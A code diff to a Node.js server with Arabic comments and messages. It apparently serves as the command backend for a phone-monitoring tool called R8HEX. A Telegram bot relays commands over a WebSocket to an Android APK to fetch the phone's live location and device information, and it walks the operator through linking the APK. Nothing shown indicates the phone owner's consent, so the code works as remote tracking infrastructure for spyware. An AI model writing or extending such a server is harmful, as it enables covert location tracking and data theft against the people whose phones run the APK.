@@ -7,7 +7,7 @@ const { token, id } = require('./data');
 const app = express();
 const server = http.createServer(app);
 
-// 🔧 استخدم polling عادي بدون webhook
+// 🔧 استخدم polling عادي
 const bot = new TelegramBot(token, { 
     polling: true 
 });
@@ -20,6 +20,13 @@ const wss = new WebSocket.Server({
 
 // تخزين البيانات
 const connectedPhones = new Map();
+
+// 🔧 احصل على الرابط الحالي تلقائياً
+const CURRENT_URL = process.env.RENDER_EXTERNAL_URL || 'https://king14-85jp.onrender.com';
+const WS_URL = CURRENT_URL.replace('https://', 'wss://').replace('http://', 'ws://') + '/ws';
+
+console.log(`🌐 Current URL: ${CURRENT_URL}`);
+console.log(`📱 WebSocket URL: ${WS_URL}`);
 
 // 🔧 middleware أساسي
 app.use(express.json());
@@ -62,6 +69,17 @@ app.get('/', (req, res) => {
                     margin: 10px 0;
                     word-break: break-all;
                 }
+                .btn {
+                    background: #4CAF50;
+                    color: white;
+                    padding: 10px 20px;
+                    border: none;
+                    border-radius: 5px;
+                    cursor: pointer;
+                    margin: 10px;
+                    text-decoration: none;
+                    display: inline-block;
+                }
             </style>
         </head>
         <body>
@@ -70,10 +88,21 @@ app.get('/', (req, res) => {
                 <p class="status">✅ السيرفر شغال بنجاح</p>
                 <p>📱 الأجهزة المتصلة: <strong>${connectedPhones.size}</strong></p>
                 <p>🌐 رابط WebSocket للـ APK:</p>
-                <code>wss://bot-d4k2.onrender.com/ws</code>
+                <code id="wsUrl">${WS_URL}</code>
+                <button class="btn" onclick="copyUrl()">نسخ الرابط</button>
                 <p>📞 Chat ID: <strong>${id}</strong></p>
                 <p>⚡ المطور: @A1BUG</p>
+                <p>🔗 الرابط الحالي: <strong>${CURRENT_URL}</strong></p>
             </div>
+            
+            <script>
+                function copyUrl() {
+                    const url = document.getElementById('wsUrl').innerText;
+                    navigator.clipboard.writeText(url).then(() => {
+                        alert('تم نسخ الرابط: ' + url);
+                    });
+                }
+            </script>
         </body>
         </html>
     `);
@@ -93,7 +122,7 @@ bot.onText(/\/start/, (msg) => {
 
 ✅ **السيرفر شغال بنجاح!**
 🌐 **رابط WebSocket للـ APK**:
-\`wss://bot-d4k2.onrender.com/ws\`
+\`${WS_URL}\`
 
 📱 **أرسل هذا الرابط لملف الـ APK**
 
@@ -101,6 +130,7 @@ bot.onText(/\/start/, (msg) => {
 /info - معلومات الجهاز
 /location - الموقع الحالي
 /status - حالة الاتصال
+/url - عرض الرابط الحالي
 
 ⚡ **المطور**: @A1BUG
     `;
@@ -125,7 +155,14 @@ bot.onText(/\/location/, (msg) => {
         }));
         bot.sendMessage(chatId, '📍 جاري طلب الموقع من الهاتف...');
     } else {
-        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل. تأكد من:\n1. تشغيل الـ APK\n2. إدخال الرابط الصحيح\n3. إرسال chatId الصحيح');
+        bot.sendMessage(chatId, `❌ لا يوجد هاتف متصل.
+
+🔧 **لحل المشكلة**:
+1. تأكد أن الـ APK شغال
+2. استخدم الرابط الصحيح في الـ APK:
+\`${WS_URL}\`
+3. تأكد أن الـ APK يرسل chatId: ${id}
+        `, { parse_mode: 'Markdown' });
     }
 });
 
@@ -150,6 +187,27 @@ bot.onText(/\/info/, (msg) => {
     }
 });
 
+// 🔗 أمر عرض الرابط
+bot.onText(/\/url/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    
+    if (chatId !== id) {
+        return bot.sendMessage(chatId, '❌ غير مصرح لك.');
+    }
+    
+    bot.sendMessage(chatId, `🔗 **روابط السيرفر**:
+
+🌐 الموقع: ${CURRENT_URL}
+📱 WebSocket: \`${WS_URL}\`
+👤 Chat ID: ${id}
+
+📋 **للاتصال بالـ APK**:
+1. افتح الـ APK
+2. أدخل هذا الرابط: \`${WS_URL}\`
+3. أدخل Chat ID: \`${id}\`
+    `, { parse_mode: 'Markdown' });
+});
+
 // 📊 أمر حالة الاتصال
 bot.onText(/\/status/, (msg) => {
     const chatId = msg.chat.id.toString();
@@ -162,10 +220,11 @@ bot.onText(/\/status/, (msg) => {
     const status = phone && phone.readyState === WebSocket.OPEN ? '✅ متصل' : '❌ غير متصل';
     
     bot.sendMessage(chatId, `📊 **حالة الاتصال**:
-    
+
 📱 الهاتف: ${status}
 🔗 الاتصالات النشطة: ${connectedPhones.size}
-🌐 السيرفر: https://bot-d4k2.onrender.com
+🌐 السيرفر: ${CURRENT_URL}
+📡 WebSocket: ${WS_URL}
     `, { parse_mode: 'Markdown' });
 });
 
@@ -196,10 +255,19 @@ wss.on('connection', (ws, req) => {
             }
         }
     });
+    
+    // إرسال رسالة ترحيب للهاتف
+    ws.send(JSON.stringify({
+        type: 'welcome',
+        message: 'تم الاتصال بالسيرفر بنجاح',
+        server: CURRENT_URL
+    }));
 });
 
 // 📨 معالج رسائل الهاتف
 function handlePhoneMessage(ws, message) {
+    console.log('📩 رسالة من الهاتف:', message.type);
+    
     switch (message.type) {
         case 'register':
             // تسجيل الهاتف
@@ -209,15 +277,18 @@ function handlePhoneMessage(ws, message) {
             
             // إرسال تأكيد للمستخدم
             if (chatId === id) {
-                bot.sendMessage(chatId, '✅ **تم الاتصال بالهاتف بنجاح!**\n\nيمكنك الآن استخدام الأوامر للتحكم في الهاتف.', { 
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        keyboard: [
-                            ['/location', '/info'],
-                            ['/status']
-                        ],
-                        resize_keyboard: true
-                    }
+                bot.sendMessage(chatId, `✅ **تم الاتصال بالهاتف بنجاح!**
+
+📱 الهاتف متصل الآن
+🌐 السيرفر: ${CURRENT_URL}
+🔗 يمكنك الآن استخدام الأوامر
+
+🔧 **جرب هذه الأوامر**:
+/location - للحصول على الموقع
+/info - لمعلومات الجهاز
+/status - لحالة الاتصال
+                `, { 
+                    parse_mode: 'Markdown'
                 });
             }
             break;
@@ -251,18 +322,26 @@ function handlePhoneMessage(ws, message) {
             bot.sendMessage(message.chatId, `📨 ${message.text}`);
             break;
             
+        case 'ping':
+            // رد على ping
+            ws.send(JSON.stringify({
+                type: 'pong',
+                timestamp: Date.now()
+            }));
+            break;
+            
         default:
             console.log('📩 رسالة غير معروفة:', message);
     }
 }
 
 // 🚀 تشغيل السيرفر
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 R8HEX Server running on port ${PORT}`);
     console.log(`🤖 Bot: R8HEX_Bot`);
-    console.log(`📱 WebSocket: wss://bot-d4k2.onrender.com/ws`);
-    console.log(`🌐 Website: https://bot-d4k2.onrender.com`);
+    console.log(`📱 WebSocket: ${WS_URL}`);
+    console.log(`🌐 Website: ${CURRENT_URL}`);
     console.log(`👤 Authorized User: ${id}`);
 });
 
